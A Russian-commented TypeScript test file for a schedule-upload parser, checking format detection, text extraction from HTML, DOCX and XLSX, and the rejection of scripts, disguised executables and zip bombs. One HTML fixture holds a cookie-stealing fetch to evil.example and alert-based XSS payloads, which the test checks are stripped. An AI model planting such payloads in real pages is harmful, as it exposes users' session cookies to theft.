/**
 * Файлы с расписанием: какие форматы принимаются, что отклоняется и какой
 * текст достаётся из HTML, Word и Excel.
 */

import { deflateRawSync } from "node:zlib";

import { describe, expect, it } from "vitest";

import { docxToText, htmlToText, prepareScheduleFile, xlsxToText } from "@/lib/scheduleFile";

const enc = (text: string) => new TextEncoder().encode(text);

/** Минимальный zip-архив (deflate) — как у настоящих .docx и .xlsx. */
function zip(entries: Record<string, string>): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;
  for (const [name, content] of Object.entries(entries)) {
    const raw = Buffer.from(content, "utf8");
    const data = deflateRawSync(raw);
    const nameBytes = Buffer.from(name, "utf8");

    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(8, 8);
    local.writeUInt32LE(data.length, 18);
    local.writeUInt32LE(raw.length, 22);
    local.writeUInt16LE(nameBytes.length, 26);
    locals.push(local, nameBytes, data);

    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(8, 10);
    central.writeUInt32LE(data.length, 20);
    central.writeUInt32LE(raw.length, 24);
    central.writeUInt16LE(nameBytes.length, 28);
    central.writeUInt32LE(offset, 42);
    centrals.push(central, nameBytes);

    offset += local.length + nameBytes.length + data.length;
  }
  const centralSize = centrals.reduce((sum, part) => sum + part.length, 0);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(Object.keys(entries).length, 8);
  end.writeUInt16LE(Object.keys(entries).length, 10);
  end.writeUInt32LE(centralSize, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, ...centrals, end]);
}

describe("что принимается", () => {
  it("картинки и PDF опознаются по содержимому", () => {
    const png = Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13]);
    expect(prepareScheduleFile("shot.png", png)).toMatchObject({ ok: true, file: { kind: "image" } });
    // Расширение не важно: это всё равно PNG.
    expect(prepareScheduleFile("shot.bin", png)).toMatchObject({ ok: true, file: { kind: "image" } });

    const pdf = enc("%PDF-1.7\n1 0 obj\n");
    const result = prepareScheduleFile("расписание.pdf", pdf);
    expect(result).toMatchObject({ ok: true, file: { kind: "pdf", name: "расписание.pdf" } });
    if (result.ok && result.file.kind === "pdf") expect(result.file.dataUrl.startsWith("data:application/pdf;base64,")).toBe(true);
  });

  it("HTML-страница портала превращается в текст таблицы, скрипты и стили вырезаются", () => {
    const html = `<!doctype html><html><head><style>td{color:red}</style>
      <script>fetch('https://evil.example/?c='+document.cookie)</script></head><body>
      <!-- комментарий -->
      <table><tr><th>Время</th><th>Monday</th></tr>
      <tr><td>1 08:00&ndash;08:50</td><td>Introduction&nbsp;to Programming</td></tr></table>
      <img src=x onerror="alert(1)"><svg><script>alert(2)</script></svg>
      </body></html>`;
    const result = prepareScheduleFile("schedule.html", enc(html));
    expect(result.ok).toBe(true);
    if (!result.ok || result.file.kind !== "text") return;
    expect(result.file.text).toContain("Время | Monday |");
    expect(result.file.text).toContain("1 08:00–08:50 | Introduction to Programming |");
    for (const leaked of ["fetch", "cookie", "alert", "color:red", "onerror", "комментарий"]) {
      expect(result.file.text).not.toContain(leaked);
    }
  });

  it("текстовые форматы из списка принимаются, в том числе в Windows-1251", () => {
    expect(prepareScheduleFile("a.csv", enc("day,start,end\nMon,08:00,08:50"))).toMatchObject({
      ok: true,
      file: { kind: "text", format: "csv" },
    });
    expect(prepareScheduleFile("cal.ics", enc("BEGIN:VCALENDAR\nSUMMARY:Матан\nEND:VCALENDAR"))).toMatchObject({ ok: true });
    // «Пн Матан» в кодировке Windows-1251.
    const cp1251 = Uint8Array.from([0xcf, 0xed, 0x20, 0xcc, 0xe0, 0xf2, 0xe0, 0xed]);
    const result = prepareScheduleFile("old.txt", cp1251);
    expect(result.ok && result.file.kind === "text" && result.file.text).toBe("Пн Матан");
  });

  it("Word: абзацы и ячейки таблицы", () => {
    const docx = zip({
      "word/document.xml":
        '<w:document><w:body><w:p><w:r><w:t>Расписание ИС-21</w:t></w:r></w:p>' +
        "<w:tbl><w:tr><w:tc><w:p><w:r><w:t>Пн</w:t></w:r></w:p></w:tc><w:tc><w:p><w:r><w:t>08:00&#8211;08:50 Матан</w:t></w:r></w:p></w:tc></w:tr></w:tbl>" +
        "</w:body></w:document>",
    });
    expect(docxToText(docx)).toContain("Расписание ИС-21");
    expect(docxToText(docx)).toContain("Пн");
    expect(docxToText(docx)).toContain("08:00–08:50 Матан");
    expect(prepareScheduleFile("r.docx", docx)).toMatchObject({ ok: true, file: { kind: "text", format: "docx" } });
  });

  it("Excel: общие строки, строки прямо в ячейке и числа", () => {
    const xlsx = zip({
      "xl/sharedStrings.xml": "<sst><si><t>Понедельник</t></si><si><r><t>Матан</t></r><r><t> (лекция)</t></r></si></sst>",
      "xl/worksheets/sheet1.xml":
        '<worksheet><sheetData><row r="1"><c r="A1" t="s"><v>0</v></c><c r="B1" t="inlineStr"><is><t>08:00-08:50</t></is></c></row>' +
        '<row r="2"><c r="A2" t="s"><v>1</v></c><c r="B2"><v>0.375</v></c></row><row r="3"/></sheetData></worksheet>',
    });
    expect(xlsxToText(xlsx)).toBe("Понедельник | 08:00-08:50\nМатан (лекция) | 0.375");
    expect(prepareScheduleFile("r.xlsx", xlsx)).toMatchObject({ ok: true, file: { kind: "text", format: "xlsx" } });
  });
});

describe("что отклоняется", () => {
  it("скрипты и код по расширению", () => {
    for (const name of ["hack.js", "run.sh", "setup.bat", "tool.py", "page.php", "x.ps1", "logo.svg", "a.mjs"]) {
      expect(prepareScheduleFile(name, enc("console.log('hi')")), name).toEqual({ ok: false, error: "format" });
    }
  });

  it("программа под видом картинки или текста — двоичные данные не проходят", () => {
    const exe = Uint8Array.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
    expect(prepareScheduleFile("schedule.png", exe)).toEqual({ ok: false, error: "format" });
    expect(prepareScheduleFile("schedule.txt", exe)).toEqual({ ok: false, error: "format" });
    expect(prepareScheduleFile("program.exe", exe)).toEqual({ ok: false, error: "format" });
  });

  it("zip, который не docx/xlsx, и docx без документа внутри", () => {
    const other = zip({ "readme.txt": "hi" });
    expect(prepareScheduleFile("archive.zip", other)).toEqual({ ok: false, error: "format" });
    expect(prepareScheduleFile("fake.docx", other)).toEqual({ ok: false, error: "empty" });
  });

  it("больше 1 МБ и пустой файл", () => {
    expect(prepareScheduleFile("big.txt", new Uint8Array(1024 * 1024 + 1).fill(65))).toEqual({ ok: false, error: "too_large" });
    expect(prepareScheduleFile("ok.txt", new Uint8Array(1024 * 1024).fill(65))).toMatchObject({ ok: true });
    expect(prepareScheduleFile("empty.txt", new Uint8Array(0))).toEqual({ ok: false, error: "empty" });
    expect(prepareScheduleFile("blank.html", enc("<html><script>x</script></html>"))).toEqual({ ok: false, error: "empty" });
  });

  it("zip-бомба не распаковывается целиком", () => {
    const bomb = zip({ "word/document.xml": "<w:t>" + "A".repeat(20 * 1024 * 1024) + "</w:t>" });
    expect(bomb.length).toBeLessThan(1024 * 1024);
    expect(prepareScheduleFile("bomb.docx", bomb)).toEqual({ ok: false, error: "empty" });
  });
});

describe("HTML без таблицы", () => {
  it("список по дням тоже превращается в текст", () => {
    expect(htmlToText("<h2>Пн</h2><ul><li>08:00 Матан</li><li>09:00 Физика</li></ul>")).toBe("Пн\n08:00 Матан\n09:00 Физика");
  });
});
